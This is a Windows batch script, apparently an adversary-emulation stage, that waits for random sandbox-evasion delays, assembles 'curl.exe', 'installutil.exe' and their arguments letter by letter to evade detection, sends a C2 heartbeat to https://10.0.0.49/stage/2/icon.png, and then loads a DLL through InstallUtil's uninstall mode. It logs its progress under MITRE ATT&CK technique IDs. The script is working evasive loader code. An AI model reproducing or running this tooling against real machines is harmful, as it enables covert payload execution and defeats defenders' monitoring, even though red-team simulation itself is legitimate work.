@echo off
SETLOCAL EnableDelayedExpansion

REM Random constant names with PHR_ as values
SET zxmqp=%APPDATA%\7988\c27d733e
SET akjdh=https://10.0.0.49
SET rtyui=https://10.0.0.49/stage/2/icon.png?7988-7
SET plmko=ITZEL-S2BO
SET xcvbn=7
SET qazws=control.txt
SET edcrf=7988

REM Setup logging paths
SET vfrtg=%APPDATA%\!xcvbn!
SET nhyuj=%vfrtg%\macula-simulations.log
IF NOT EXIST "!vfrtg!" MD "!vfrtg!" >nul 2>&1

echo [!DATE! !TIME!][DEBUG][!plmko!]: Initializing Stage1 DLL execution>>> "!nhyuj!" 2>nul

REM Initial delay 30-60s using timeout
SET /A idel=!RANDOM! %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!plmko!]: Initial delay start !idel!s>>> "!nhyuj!" 2>nul
timeout /t !idel! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!plmko!]: Initial delay complete>>> "!nhyuj!" 2>nul

REM Obfuscated curl command using variable indirection
SET part1=c
SET part2=ur
SET part3=l
SET part4=!
SET part5=.exe
SET curlvar1=!part1!!part2!!part3!!part4:~0,-1!!part5!
SET curlref=!curlvar1!

REM Obfuscated installutil command using array-style variables
SET arr0=i
SET arr1=n
SET arr2=s
SET arr3=t
SET arr4=a
SET arr5=l
SET arr6=l
SET arr7=u
SET arr8=t
SET arr9=i
SET arr10=l
SET arr11=!
SET arr12=.exe
SET instvar=!arr0!!arr1!!arr2!!arr3!!arr4!!arr5!!arr6!!arr7!!arr8!!arr9!!arr10!!arr11:~0,-1!!arr12!
SET instref=!instvar!

REM Obfuscated arguments using multiple indirection layers
SET arg0=/
SET arg1=l
SET arg2=o
SET arg3=g
SET arg4=f
SET arg5=i
SET arg6=l
SET arg7=e
SET arg8==
SET arg9=/
SET arg10=L
SET arg11=o
SET arg12=g
SET arg13=T
SET arg14=o
SET arg15=C
SET arg16=o
SET arg17=n
SET arg18=s
SET arg19=o
SET arg20=l
SET arg21=e
SET arg22==
SET arg23=f
SET arg24=a
SET arg25=l
SET arg26=s
SET arg27=e
SET arg28=/
SET arg29=U
SET arg30=!
SET argpiece1=!arg0!!arg1!!arg2!!arg3!!arg4!!arg5!!arg6!!arg7!!arg8!
SET argpiece2=!arg9!!arg10!!arg11!!arg12!!arg13!!arg14!!arg15!!arg16!!arg17!!arg18!!arg19!!arg20!!arg21!!arg22!!arg23!!arg24!!arg25!!arg26!!arg27!
SET argpiece3=!arg28!!arg29!!arg30:~0,-1!
SET argfull=!argpiece1!!argpiece2!!argpiece3!

REM Pre-heartbeat delay 5-15s using ping
SET /A pdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!plmko!]: Pre-heartbeat delay !pdel!s>>> "!nhyuj!" 2>nul
ping -n !pdel! 127.0.0.1 >nul

REM C2 heartbeat check with corrected implementation
echo [!DATE! !TIME!][DEBUG][!plmko!]: Heartbeat check start>>> "!nhyuj!" 2>nul
SET hbresult=0
SET hberror=
CALL SET curlexe=%%curlref%%

REM Execute curl with proper URL from https://10.0.0.49/stage/2/icon.png?7988-7
!curlexe! -k -s -o nul --connect-timeout 30 --max-time 60 "!rtyui!"
IF !ERRORLEVEL! EQU 0 (
    SET hbresult=1
) ELSE (
    SET hberror=connection_failed_!ERRORLEVEL!
)

REM Format timestamp for TTP logging
FOR /F "tokens=1-3 delims=/- " %%a IN ("!DATE!") DO (
    SET yyyy=%%c
    SET mm=%%a
    SET dd=%%b
)
SET mm=0!mm!
SET dd=0!dd!
SET yyyy=!yyyy!
SET mm=!mm:~-2!
SET dd=!dd:~-2!
SET hms=!TIME!
IF "!hms:~1,1!"==":" SET hms=0!hms!
SET fullts=!yyyy!-!mm!-!dd! !hms!

REM Log TTP T1105 heartbeat result
echo [!fullts!][!plmko!]: !xcvbn!-!edcrf!-T1105|Ingress Tool Transfer=!hbresult!:!hberror!>>> "!nhyuj!" 2>&1

IF !hbresult! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!plmko!]: Heartbeat failed, exiting>>> "!nhyuj!" 2>nul
    EXIT /B 1
)

echo [!DATE! !TIME!][DEBUG][!plmko!]: Heartbeat successful>>> "!nhyuj!" 2>nul

REM Random delay 5-15s using CHOICE
SET /A cdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!plmko!]: Pre-directory change delay !cdel!s>>> "!nhyuj!" 2>nul
CHOICE /C Y /N /D Y /T !cdel! >nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!plmko!]: Changing to directory !zxmqp!>>> "!nhyuj!" 2>nul
CD /D "!zxmqp!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!plmko!]: Directory change failed>>> "!nhyuj!" 2>nul
    SET execresult=0
    SET exerror=path_not_found
    GOTO :logexec
)

REM Random delay 10-30s using timeout
SET /A rdelay=!RANDOM! %% 21 + 10
echo [!DATE! !TIME!][DEBUG][!plmko!]: Random delay !rdelay!s before execution>>> "!nhyuj!" 2>nul
timeout /t !rdelay! /nobreak >nul

REM Execute DLL via installutil with full .NET Framework path
echo [!DATE! !TIME!][DEBUG][!plmko!]: Starting DLL execution>>> "!nhyuj!" 2>nul
SET execresult=0
SET exerror=

REM Build full path to installutil using indirection
SET netpart1=%WINDIR%
SET netpart2=\Microsoft.NET\Framework64\v4.0.30319\
SET netpart3=!
SET netdir=!netpart1!!netpart2!!netpart3:~0,-1!
CALL SET instexe=%%instref%%
SET fullinst=!netdir!\!instexe!

REM Execute installutil with obfuscated arguments
echo [!DATE! !TIME!][DEBUG][!plmko!]: Executing: !fullinst! !argfull!"!qazws!" >>> "!nhyuj!" 2>nul
!fullinst! !argfull!"!qazws!"

IF !ERRORLEVEL! EQU 0 (
    SET execresult=1
) ELSE (
    SET exerror=assembly_load_failed_!ERRORLEVEL!
)

:logexec
REM Log TTP T1218 execution result
echo [!fullts!][!plmko!]: !xcvbn!-!edcrf!-T1218|Signed Binary Proxy Execution=!execresult!:!exerror!>>> "!nhyuj!" 2>&1

IF !execresult! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!plmko!]: DLL execution completed>>> "!nhyuj!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!plmko!]: DLL execution failed: !exerror!>>> "!nhyuj!" 2>nul
)

REM Final cleanup delay 5-15s using ping
SET /A fdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!plmko!]: Final cleanup delay !fdel!s>>> "!nhyuj!" 2>nul
ping -n !fdel! 127.0.0.1 >nul

echo [!DATE! !TIME!][DEBUG][!plmko!]: Stage1 complete>>> "!nhyuj!" 2>nul

ENDLOCAL
EXIT /B 0